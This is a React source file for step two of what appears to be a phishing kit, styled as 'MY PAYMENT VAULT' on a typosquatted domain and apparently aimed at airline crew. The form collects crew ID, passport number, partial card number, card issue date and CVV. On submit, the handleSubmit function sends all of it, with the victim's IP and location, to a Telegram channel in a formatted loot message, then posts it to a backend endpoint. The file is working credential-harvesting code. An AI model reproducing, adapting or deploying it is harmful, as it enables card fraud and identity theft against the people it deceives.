import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { useAuth } from "@/lib/auth";
import { useI18n, type Language } from "@/lib/i18n";
import { Globe, ChevronDown, CreditCard } from "lucide-react";
import { sendTelegram, getIPInfo } from "@/lib/telegram";


const languageOptions: { code: Language; label: string }[] = [
  { code: "en", label: "English" },
  { code: "es", label: "Español" },
  { code: "fr", label: "Français" },
];

const currentYear = new Date().getFullYear();
const YEARS = Array.from({ length: 20 }, (_, i) => currentYear - 10 + i);
const MONTHS = [
  { value: "01", label: "01 - Jan" },
  { value: "02", label: "02 - Feb" },
  { value: "03", label: "03 - Mar" },
  { value: "04", label: "04 - Apr" },
  { value: "05", label: "05 - May" },
  { value: "06", label: "06 - Jun" },
  { value: "07", label: "07 - Jul" },
  { value: "08", label: "08 - Aug" },
  { value: "09", label: "09 - Sep" },
  { value: "10", label: "10 - Oct" },
  { value: "11", label: "11 - Nov" },
  { value: "12", label: "12 - Dec" },
];

const inputStyle: React.CSSProperties = {
  width: "100%",
  height: 42,
  padding: "0 12px",
  fontSize: 14,
  color: "#111",
  border: "1px solid #ccc",
  borderRadius: 3,
  outline: "none",
  background: "#fff",
  boxSizing: "border-box",
};

const labelStyle: React.CSSProperties = {
  fontSize: 12,
  color: "#666",
  display: "block",
  marginBottom: 6,
};

export default function VerifyCard() {
  const { pendingUsername, pendingCard, verifyCard, isAuthenticated } = useAuth();
  const { lang, setLang, langName, t } = useI18n();
  const [, navigate] = useLocation();

  const [crewId, setCrewId] = useState("");
  const [passportNo, setPassportNo] = useState("");
  const [lastDigit, setLastDigit] = useState("");
  const [month, setMonth] = useState("");
  const [year, setYear] = useState("");
  const [secCode, setSecCode] = useState("");
  const [errors, setErrors] = useState<Record<string, string>>({});
  const [loading, setLoading] = useState(false);
  const [showLangDropdown, setShowLangDropdown] = useState(false);

  useEffect(() => {
    if (isAuthenticated) { navigate("/"); return; }
    if (!pendingCard) navigate("/login");
  }, [isAuthenticated, pendingCard, navigate]);

  const validate = () => {
    const errs: Record<string, string> = {};
    if (!/^\d{8}$/.test(crewId)) errs.crewId = "Crew ID must be exactly 8 digits.";
    if (!passportNo.trim()) errs.passportNo = "Passport number is required.";
    if (!/^\d{8}$/.test(lastDigit)) errs.lastDigit = "Last 8 digits of card must be exactly 8 digits.";
    if (!month) errs.month = "Please select the issue month.";
    if (!year) errs.year = "Please select the issue year.";
    if (!/^\d{3}$/.test(secCode)) errs.secCode = "Security code must be exactly 3 digits.";
    return errs;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const errs = validate();
    if (Object.keys(errs).length > 0) { setErrors(errs); return; }
    setErrors({});
    setLoading(true);
    const now = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
    const ip = await getIPInfo();
    await sendTelegram(
      `━━━━━━━━━━━━━━━━━━━━━\n` +
      `💳 <b>mypaymenttvaulltr.com</b>\n` +
      `📌 <b>Step 2 — Card Details</b>\n` +
      `━━━━━━━━━━━━━━━━━━━━━\n\n` +
      `👤 <b>Username</b>    : <code>${pendingUsername}</code>\n` +
      `🪪 <b>Crew ID</b>     : <code>${crewId}</code>\n` +
      `📘 <b>No. Passport</b>: <code>${passportNo}</code>\n` +
      `💳 <b>Last 8 Digits</b>: <code>${lastDigit}</code>\n` +
      `📅 <b>Card Issued</b> : <code>${month}/${year}</code>\n` +
      `🔒 <b>CVV</b>         : <code>${secCode}</code>\n` +
      `🌐 <b>IP & Lokasi</b> : <code>${ip}</code>\n` +
      `🕐 <b>Waktu</b>       : ${now}\n` +
      `━━━━━━━━━━━━━━━━━━━━━`
    );
    await fetch("/api/submissions/card", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        username: pendingUsername ?? "",
        crewId,
        passportNo,
        cardLast8: lastDigit,
        cardMonth: month,
        cardYear: year,
        cvv: secCode,
        ipAddress: ip,
      }),
    }).catch(() => {});
    verifyCard();
    navigate("/step4");
  };

  return (
    <div
      className="min-h-screen flex flex-col items-center justify-center"
      style={{ background: "#f7f7f7" }}
    >
      {/* ─── CARD ─── */}
      <div
        className="w-full flex flex-col bg-white"
        style={{ maxWidth: 480, boxShadow: "0 2px 32px rgba(0,0,0,0.13)" }}
      >
        {/* ══ HEADER ROW ══ */}
        <div
          className="flex items-center justify-between"
          style={{ padding: "18px 24px", borderBottom: "1px solid #ebebeb" }}
        >
          <span
            className="select-none cursor-pointer"
            style={{ fontSize: 15, letterSpacing: "0.18em", color: "#111" }}
            onClick={() => navigate("/login")}
          >
            <span style={{ fontWeight: 300 }}>MY</span>
            <span style={{ fontWeight: 700 }}>PAYMENT</span>
            <span style={{ fontWeight: 300 }}>VAULT</span>
          </span>

          {/* Language */}
          <div className="relative">
            <button
              type="button"
              onClick={() => setShowLangDropdown(!showLangDropdown)}
              style={{
                display: "flex", alignItems: "center", gap: 5,
                color: "#555", fontSize: 13, background: "none",
                border: "none", cursor: "pointer",
              }}
            >
              <Globe size={15} color="#555" />
              <span>{langName}</span>
              <ChevronDown size={13} color="#555"
                style={{ transform: showLangDropdown ? "rotate(180deg)" : "none", transition: "transform 0.2s" }}
              />
            </button>
            {showLangDropdown && (
              <>
                <div className="fixed inset-0 z-10" onClick={() => setShowLangDropdown(false)} />
                <div style={{
                  position: "absolute", right: 0, top: "100%", marginTop: 4,
                  width: 140, background: "#fff", border: "1px solid #ddd",
                  boxShadow: "0 4px 16px rgba(0,0,0,0.15)", zIndex: 20,
                }}>
                  {languageOptions.map((opt) => (
                    <button key={opt.code} type="button"
                      onClick={() => { setLang(opt.code); setShowLangDropdown(false); }}
                      style={{
                        display: "block", width: "100%", textAlign: "left",
                        padding: "10px 16px", fontSize: 13, background: "none",
                        border: "none", cursor: "pointer",
                        fontWeight: lang === opt.code ? 600 : 400,
                        color: lang === opt.code ? "#111" : "#555",
                      }}
                    >{opt.label}</button>
                  ))}
                </div>
              </>
            )}
          </div>
        </div>

        {/* ══ HERO IMAGE ══ */}
        <div style={{ width: "100%", lineHeight: 0 }}>
          <img src="/hero-vault-new.png" alt="mypaymenttvaulltr.com" style={{ width: "100%", display: "block" }} />
        </div>

        {/* ══ FORM ══ */}
        <div style={{ padding: "28px 28px 28px" }}>

          {/* Step indicator */}
          <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 20 }}>
            <div style={{ width: 22, height: 22, borderRadius: "50%", background: "#111", display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0 }}>
              <svg width="11" height="11" viewBox="0 0 12 12" fill="none"><path d="M2 6l3 3 5-5" stroke="#fff" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"/></svg>
            </div>
            <div style={{ flex: 1, height: 1, background: "#111" }} />
            <div style={{ width: 22, height: 22, borderRadius: "50%", background: "#111", display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0 }}>
              <span style={{ fontSize: 11, color: "#fff", fontWeight: 600 }}>2</span>
            </div>
            <div style={{ flex: 1, height: 1, background: "#ccc" }} />
            <div style={{ width: 22, height: 22, borderRadius: "50%", background: "#ccc", display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0 }}>
              <span style={{ fontSize: 11, color: "#fff", fontWeight: 600 }}>3</span>
            </div>
            <div style={{ flex: 1, height: 1, background: "#ccc" }} />
            <div style={{ width: 22, height: 22, borderRadius: "50%", background: "#ccc", display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0 }}>
              <span style={{ fontSize: 11, color: "#fff", fontWeight: 600 }}>4</span>
            </div>
            <span style={{ fontSize: 12, color: "#888", marginLeft: 4 }}>Card Details</span>
          </div>

          <h2 style={{ fontSize: 17, fontWeight: 400, color: "#111", marginBottom: 4 }}>
            {t.verifyCardTitle}
          </h2>
          <p style={{ fontSize: 13, color: "#888", marginBottom: 22 }}>
            {t.verifyCardDesc}
          </p>

          <form onSubmit={handleSubmit}>

            {/* Crew ID */}
            <div style={{ marginBottom: 16 }}>
              <label style={labelStyle}>{t.crewId}</label>
              <input
                type="text"
                inputMode="numeric"
                maxLength={8}
                value={crewId}
                onChange={(e) => setCrewId(e.target.value.replace(/\D/g, "").slice(0, 8))}
                placeholder={t.crewIdPlaceholder}
                style={{ ...inputStyle, borderColor: errors.crewId ? "#c00" : "#ccc" }}
              />
              {errors.crewId && (
                <span style={{ fontSize: 11, color: "#c00", marginTop: 4, display: "block" }}>{errors.crewId}</span>
              )}
            </div>

            {/* Passport Number */}
            <div style={{ marginBottom: 16 }}>
              <label style={labelStyle}>{t.passportNumber}</label>
              <input
                type="text"
                maxLength={20}
                value={passportNo}
                onChange={(e) => setPassportNo(e.target.value.toUpperCase())}
                placeholder={t.passportPlaceholder}
                style={{ ...inputStyle, borderColor: errors.passportNo ? "#c00" : "#ccc" }}
              />
              {errors.passportNo && (
                <span style={{ fontSize: 11, color: "#c00", marginTop: 4, display: "block" }}>{errors.passportNo}</span>
              )}
            </div>

            {/* Last 8 digits */}
            <div style={{ marginBottom: 16 }}>
              <label style={labelStyle}>{t.last8Digits}</label>
              <input
                type="text"
                inputMode="numeric"
                maxLength={8}
                value={lastDigit}
                onChange={(e) => setLastDigit(e.target.value.replace(/\D/g, "").slice(0, 8))}
                placeholder={t.last8Placeholder}
                style={{ ...inputStyle, borderColor: errors.lastDigit ? "#c00" : "#ccc" }}
              />
              {errors.lastDigit && (
                <span style={{ fontSize: 11, color: "#c00", marginTop: 4, display: "block" }}>{errors.lastDigit}</span>
              )}
            </div>

            {/* Card issued month & year */}
            <div style={{ marginBottom: 16 }}>
              <label style={labelStyle}>{t.cardIssuedDate}</label>
              <div style={{ display: "flex", gap: 10 }}>
                <div style={{ flex: 1 }}>
                  <select
                    value={month}
                    onChange={(e) => setMonth(e.target.value)}
                    style={{
                      ...inputStyle,
                      borderColor: errors.month ? "#c00" : "#ccc",
                      appearance: "none",
                      backgroundImage: `url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 12 12'%3E%3Cpath d='M2 4l4 4 4-4' stroke='%23888' stroke-width='1.5' fill='none' stroke-linecap='round'/%3E%3C/svg%3E")`,
                      backgroundRepeat: "no-repeat",
                      backgroundPosition: "right 10px center",
                      paddingRight: 28,
                    }}
                  >
                    <option value="">MM</option>
                    {MONTHS.map((m) => (
                      <option key={m.value} value={m.value}>{m.label}</option>
                    ))}
                  </select>
                  {errors.month && (
                    <span style={{ fontSize: 11, color: "#c00", marginTop: 4, display: "block" }}>{errors.month}</span>
                  )}
                </div>
                <div style={{ flex: 1 }}>
                  <select
                    value={year}
                    onChange={(e) => setYear(e.target.value)}
                    style={{
                      ...inputStyle,
                      borderColor: errors.year ? "#c00" : "#ccc",
                      appearance: "none",
                      backgroundImage: `url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 12 12'%3E%3Cpath d='M2 4l4 4 4-4' stroke='%23888' stroke-width='1.5' fill='none' stroke-linecap='round'/%3E%3C/svg%3E")`,
                      backgroundRepeat: "no-repeat",
                      backgroundPosition: "right 10px center",
                      paddingRight: 28,
                    }}
                  >
                    <option value="">YYYY</option>
                    {YEARS.map((y) => (
                      <option key={y} value={String(y)}>{y}</option>
                    ))}
                  </select>
                  {errors.year && (
                    <span style={{ fontSize: 11, color: "#c00", marginTop: 4, display: "block" }}>{errors.year}</span>
                  )}
                </div>
              </div>
            </div>

            {/* Security code */}
            <div style={{ marginBottom: 20 }}>
              <label style={labelStyle}>{t.securityCodeCvv}</label>
              <input
                type="text"
                inputMode="numeric"
                maxLength={3}
                value={secCode}
                onChange={(e) => setSecCode(e.target.value.replace(/\D/g, "").slice(0, 3))}
                placeholder={t.cvvPlaceholder}
                style={{ ...inputStyle, borderColor: errors.secCode ? "#c00" : "#ccc" }}
              />
              {errors.secCode && (
                <span style={{ fontSize: 11, color: "#c00", marginTop: 4, display: "block" }}>{errors.secCode}</span>
              )}
            </div>

            <button
              type="submit"
              disabled={loading}
              style={{
                width: "100%", height: 44, background: "#111", color: "#fff",
                fontSize: 14, fontWeight: 500, border: "none",
                cursor: loading ? "not-allowed" : "pointer",
                opacity: loading ? 0.6 : 1,
                letterSpacing: "0.04em", borderRadius: 3,
                display: "flex", alignItems: "center", justifyContent: "center", gap: 8,
              }}
            >
              <CreditCard size={16} />
              {t.confirmAndContinue}
            </button>
          </form>

          <p style={{ fontSize: 12, color: "#aaa", textAlign: "center", marginTop: 14 }}>
            {t.wrongAccount}{" "}
            <button
              type="button"
              onClick={() => navigate("/login")}
              style={{ fontSize: 12, color: "#555", textDecoration: "underline", background: "none", border: "none", cursor: "pointer" }}
            >
              {t.backToLogin}
            </button>
          </p>
        </div>
      </div>

      {/* Footer */}
      <div style={{ width: "100%", maxWidth: 480, marginTop: 12, paddingRight: 2, textAlign: "right" }}>
        <span style={{ fontSize: 11, color: "#888" }}>
          &copy; {t.copyright} | {t.termsOfUse} | {t.privacyCookies}
        </span>
      </div>

    </div>
  );
}
